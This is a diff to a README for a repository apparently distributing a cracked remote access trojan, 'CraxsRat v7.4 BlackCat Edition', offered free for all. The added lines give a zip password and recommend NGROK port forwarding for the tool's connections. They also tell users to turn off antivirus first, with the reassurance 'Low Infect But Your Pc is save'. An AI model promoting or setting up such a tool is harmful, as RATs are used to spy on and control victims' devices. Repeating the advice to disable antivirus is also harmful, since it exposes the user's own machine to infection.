@@ -1,4 +1,14 @@
 # CraxsRat-v7.4-BlackCat-Edition-By-BlackCat-AK2
-~ Modify By BlackCat-AK2~ Fix connection problems. ⭐️ Free for all. ⭐️ Tested on Windows 8, 10, 11 and Windows Server 2012, 2016. ⭐️ Tested on VirtualBox, VMWare. ⭐️ ~Low Infect But Your Pc is Save~
-Zip Passwd=AK
+~This Is Blackcat-AK Edition Version🐱~
+~Free For All~
+~Email=AK
+~Passwd=AK
+~Use NGROK For Port Forwading~
+~Zip File Passwd=AK~
+~Low Insfect But Your Pc is save~
+~Turn Off Anti-Virus First To Run Tool Proper~
+~Extract Win.MM.Net File~
+~Always Use Virtual Window For Cracked Tool~
+~Test For Original Window And Virtual~
+~Always Give Support~
 
